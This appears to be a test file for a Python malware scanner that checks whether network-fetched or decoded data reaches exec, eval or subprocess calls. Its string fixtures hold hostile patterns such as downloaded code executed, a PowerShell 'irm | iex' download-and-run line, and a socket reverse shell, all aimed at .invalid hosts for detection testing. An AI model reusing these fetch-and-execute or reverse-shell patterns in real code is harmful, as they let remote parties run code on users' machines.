"""Where the code a Python file runs comes from (`analysis/python/sourced_flows.py`), and the dropper
it lowers when nothing fetched or decoded reaches what runs (`CompositeGrading`, unsourced code).

Every source is written fresh for the test; hosts are under `.invalid` and nothing here is run.
"""

from __future__ import annotations

from typing import ClassVar

from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.detect.base import FileUnit, ScanContext
from cordon_scanner.detect.code.capability.detector import CapabilityDetector
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.models import Severity
from cordon_scanner.rules.loader import RuleLoader, RuleSet


class FlowKit:
    LOCAL_VERSION: ClassVar[str] = (
        "import os, base64, requests\n"
        "index = requests.get('https://index.invalid/simple/', timeout=5).text\n"
        "v = {}\n"
        "with open(os.path.join(os.path.dirname(__file__), 'version.py')) as fp:\n"
        "    exec(fp.read(), v)\n"
        "token = base64.b64decode(os.environ.get('TOKEN', ''))\n"
    )
    FETCHED_MODULE: ClassVar[str] = (
        "import base64, types, urllib.request\n"
        "with urllib.request.urlopen(base64.b64decode('aHR0cHM6Ly94LmludmFsaWQv').decode()) as resp:\n"
        "    module = types.ModuleType('checker')\n"
        "    exec(resp.read(), module.__dict__)\n"
    )

    @staticmethod
    def fetch_exec(source: str) -> list[int]:
        return [
            h.line for h in PythonAnalyzer.analyse(source) if h.capability is Capability.FETCH_EXEC
        ]

    @staticmethod
    def dropper(source: str) -> list[Severity]:
        unit = FileUnit(
            content=FileContent.from_bytes("pkg/__init__.py", source.encode()), language="python"
        )
        ctx = ScanContext(config=Config.default(), rules=RuleSet(RuleLoader.load_builtin()))
        return [
            f.severity
            for f in CapabilityDetector().inspect(unit, ctx)
            if f.rule_id == "SUSPECT.DROPPER.001"
        ]


class TestNetworkFlowsThroughEveryBinding:
    def test_a_module_fetched_in_a_with_block_and_run(self) -> None:
        assert FlowKit.fetch_exec(FlowKit.FETCHED_MODULE) == [4]

    def test_a_for_target_over_a_response(self) -> None:
        source = (
            "import urllib.request\n"
            "for line in urllib.request.urlopen('https://x.invalid/c'):\n"
            "    exec(line)\n"
        )
        assert FlowKit.fetch_exec(source) == [3]

    def test_a_shell_handed_a_download_piped_into_it(self) -> None:
        source = (
            "import subprocess\n"
            "subprocess.run(['powershell', '-NoExit', '-Command', 'irm https://x.invalid/a | iex'])\n"
        )
        assert FlowKit.fetch_exec(source) == [2]

    def test_an_interpreter_given_what_a_download_printed(self) -> None:
        source = (
            "import subprocess\n"
            "r = subprocess.run(['curl', '-s', 'https://x.invalid/a'], capture_output=True, text=True)\n"
            "subprocess.run(['node', '-e', r.stdout])\n"
        )
        assert FlowKit.fetch_exec(source) == [3]

    def test_an_argument_list_naming_a_program_passes_data(self) -> None:
        source = (
            "import subprocess, requests\n"
            "sha = requests.get('https://x.invalid/sha').text\n"
            "subprocess.run(['git', 'checkout', sha])\n"
        )
        assert FlowKit.fetch_exec(source) == []


class TestWhatASinkIsHanded:
    def test_a_local_file_and_a_setting_are_not_sourced(self) -> None:
        every, sourced = PythonAnalyzer.sink_sources(
            "import os\nexec(open('version.py').read(), {})\nx = eval(os.environ.get('W', '0.8'))\n"
        ) or (frozenset(), frozenset())
        assert every == {2, 3} and sourced == set()

    def test_fetched_decoded_and_parameter_fed_sinks_are_sourced(self) -> None:
        found = PythonAnalyzer.sink_sources(
            "import base64, pickle, requests\n"
            "exec(requests.get('https://x.invalid').text)\n"
            "pickle.loads(base64.b64decode(BLOB))\n"
            "def run(code):\n"
            "    exec(code)\n"
        )
        assert found is not None and found[1] == {2, 3, 5}

    def test_a_file_that_does_not_parse_says_nothing(self) -> None:
        assert PythonAnalyzer.sink_sources("def broken(:\n") is None


class TestTheDropperLowersOnlyWhatNothingFetchedReaches:
    def test_a_local_version_file_run_beside_a_request_is_lowered(self) -> None:
        assert FlowKit.dropper(FlowKit.LOCAL_VERSION) == [Severity.MEDIUM]

    def test_a_fetched_module_run_still_blocks(self) -> None:
        assert FlowKit.dropper(FlowKit.FETCHED_MODULE) == [Severity.HIGH]

    def test_decoded_code_run_beside_a_request_still_blocks(self) -> None:
        source = (
            "import base64, requests\n"
            "requests.get('https://x.invalid/ping')\n"
            "exec(base64.b64decode(BLOB))\n"
        )
        assert FlowKit.dropper(source) == [Severity.HIGH]


class TestEachFunctionHasItsOwnNames:
    """A name fetched in one function is not the same-named variable of another; the flows between
    functions (a return, an argument, a global, a closure) are followed instead."""

    FETCH: ClassVar[str] = "urllib.request.urlopen('https://x.invalid/').read().decode()"

    def test_a_fetched_name_does_not_taint_another_functions_parameter(self) -> None:
        source = (
            "import json, subprocess, urllib.request\n"
            "def exchange():\n"
            "    payload = json.loads(urllib.request.urlopen('https://x.invalid/').read())\n"
            "    return payload['token']\n"
            "def create(cli, payload):\n"
            "    path = str(payload)\n"
            "    cmd = [*cli, 'apps', 'create', path]\n"
            "    return subprocess.run(cmd)\n"
        )
        assert FlowKit.fetch_exec(source) == []

    def test_fetched_text_returned_by_a_helper_and_run(self) -> None:
        source = (
            "import subprocess, urllib.request\n"
            f"def get():\n    return {self.FETCH}\n"
            "def main():\n    command = get()\n    subprocess.run(command, shell=True)\n"
        )
        assert FlowKit.fetch_exec(source) == [6]

    def test_fetched_text_passed_to_a_local_runner(self) -> None:
        source = (
            "import subprocess, urllib.request\n"
            "def run_it(c):\n    subprocess.run(c, shell=True)\n"
            f"def main():\n    body = {self.FETCH}\n    run_it(body)\n"
        )
        assert FlowKit.fetch_exec(source) == [3]

    def test_fetched_text_passed_by_keyword(self) -> None:
        source = (
            "import subprocess, urllib.request\n"
            "def run_it(*, c):\n    subprocess.run(c, shell=True)\n"
            f"body = {self.FETCH}\nrun_it(c=body)\n"
        )
        assert FlowKit.fetch_exec(source) == [3]

    def test_a_global_set_by_one_function_and_run_by_another(self) -> None:
        source = (
            "import subprocess, urllib.request\nCMD = ''\n"
            f"def fetch():\n    global CMD\n    CMD = {self.FETCH}\n"
            "def run():\n    subprocess.run(CMD, shell=True)\n"
        )
        assert FlowKit.fetch_exec(source) == [7]

    def test_a_closure_over_a_fetched_name(self) -> None:
        source = (
            "import subprocess, urllib.request\n"
            f"def outer():\n    body = {self.FETCH}\n"
            "    def inner():\n        subprocess.run(body, shell=True)\n    inner()\n"
        )
        assert FlowKit.fetch_exec(source) == [5]

    def test_code_a_helper_returns_from_a_with_block_is_executed(self) -> None:
        source = (
            "import urllib.request\n"
            "def load():\n"
            "    with urllib.request.urlopen('https://x.invalid/') as r:\n"
            "        return r.read()\n"
            "exec(load())\n"
        )
        assert FlowKit.fetch_exec(source) == [5]


class TestFlowsTheOldNameJoinOnlyFoundByChance:
    """Real flows the whole-file name taint caught only when a name happened to repeat."""

    def test_an_fstring_url_does_not_hide_what_the_request_returns(self) -> None:
        source = (
            "import requests\n"
            "def ids(slug):\n"
            "    resp = requests.get(f'https://x.invalid/{slug}', timeout=5)\n"
            "    events = resp.json()\n"
            "    return eval(events[0]['t'])\n"
        )
        assert FlowKit.fetch_exec(source) == [5]

    def test_a_command_handed_to_a_method_on_self(self) -> None:
        source = (
            "import subprocess, requests\n"
            "class Bot:\n"
            "    def poll(self):\n"
            "        for command in requests.get('https://x.invalid/c').json():\n"
            "            self._run(command['cmd'])\n"
            "    def _run(self, command):\n"
            "        subprocess.run(command, shell=True)\n"
        )
        assert FlowKit.fetch_exec(source) == [7]

    def test_a_download_written_to_a_path_and_executed_from_it(self) -> None:
        source = (
            "import httpx\nfrom pathlib import Path\nSCRIPT = Path('/tmp/s.py')\n"
            "def download(url, output_path):\n    output_path.write_text(httpx.get(url).text)\n"
            "def execute(script_path):\n    exec(script_path.read_text())\n"
            "def main():\n    download('https://x.invalid/s', SCRIPT)\n    execute(SCRIPT)\n"
        )
        assert FlowKit.fetch_exec(source) == [7]

    def test_a_remote_config_saved_loaded_and_its_commands_run(self) -> None:
        source = (
            "import json, subprocess, requests\nCONFIG = 'config.json'\n"
            "def fetch_remote(url, path):\n"
            "    with open(path, 'w') as f:\n        json.dump(requests.get(url).json(), f)\n"
            "def load(path):\n    with open(path) as f:\n        return json.load(f)\n"
            "def run_init(config):\n"
            "    command = config.get('commands', {}).get('init')\n"
            "    subprocess.run(command, shell=True)\n"
            "def main():\n"
            "    config = load(CONFIG)\n"
            "    fetch_remote('https://x.invalid/c', CONFIG)\n"
            "    run_init(config)\n"
        )
        assert FlowKit.fetch_exec(source) == [11]

    def test_an_argument_list_bound_to_a_name_passes_data(self) -> None:
        source = (
            "import subprocess, requests\n"
            "def close(token):\n"
            "    price = requests.get('https://x.invalid/p').json()['bid']\n"
            "    cmd = ['tool', 'sell', '--token', token, '--price', str(price)]\n"
            "    subprocess.run(cmd, capture_output=True)\n"
        )
        assert FlowKit.fetch_exec(source) == []

    def test_a_local_config_file_is_not_a_download(self) -> None:
        source = (
            "import json, subprocess, requests\n"
            "def check():\n    return requests.get('https://x.invalid/v').json()['version']\n"
            "def run(path):\n"
            "    with open(path) as f:\n        cfg = json.load(f)\n"
            "    subprocess.run(cfg['build'], shell=True)\n"
        )
        assert FlowKit.fetch_exec(source) == []


class TestHelpersAndFields:
    """Helpers written as lambdas, a dict's fields one by one, and a command list a caller hands in."""

    def test_a_reverse_shell_through_lambda_helpers(self) -> None:
        source = (
            "import socket, subprocess\nsock = socket.socket()\n"
            "recv = lambda n: sock.recv(n)\ndecode = lambda d: d.decode('utf-8')\n"
            "def shell():\n    data = decode(recv(1024))\n    subprocess.Popen(data, shell=True)\n"
        )
        assert FlowKit.fetch_exec(source) == [7]

    def test_a_local_path_returned_beside_fetched_fields_is_not_fetched(self) -> None:
        source = (
            "import os, requests\n"
            "def tts(text, out):\n"
            "    data = requests.post('https://x.invalid/t', json={'t': text}).json()\n"
            "    return {'ok': True, 'file_path': out, 'trace': data.get('trace_id')}\n"
            "def speak(text):\n"
            "    result = tts(text, '/tmp/a.mp3')\n"
            "    os.startfile(result['file_path'])\n"
        )
        assert FlowKit.fetch_exec(source) == []

    def test_a_fetched_field_returned_and_run(self) -> None:
        source = (
            "import subprocess, requests\n"
            "def task():\n"
            "    data = requests.get('https://x.invalid/t').json()\n"
            "    return {'ok': True, 'cmd': data['cmd']}\n"
            "def run():\n    r = task()\n    subprocess.run(r['cmd'], shell=True)\n"
        )
        assert FlowKit.fetch_exec(source) == [7]

    def test_argument_lists_every_caller_hands_in_pass_data(self) -> None:
        source = (
            "import subprocess, requests\n"
            "def call(argv):\n    return subprocess.Popen(argv)\n"
            "def probe():\n"
            "    slug = requests.get('https://x.invalid/c').json()['slug']\n"
            "    argv = [slug, '--version'] if slug else ['tool', '--help']\n"
            "    call(argv)\n"
            "def update():\n    call(['tool', 'update'])\n"
        )
        assert FlowKit.fetch_exec(source) == []

    def test_a_fetched_string_a_caller_hands_in_is_run(self) -> None:
        source = (
            "import subprocess, requests\n"
            "def call(cmd):\n    return subprocess.Popen(cmd, shell=True)\n"
            "def main():\n    call(requests.get('https://x.invalid/c').text)\n"
        )
        assert FlowKit.fetch_exec(source) == [3]
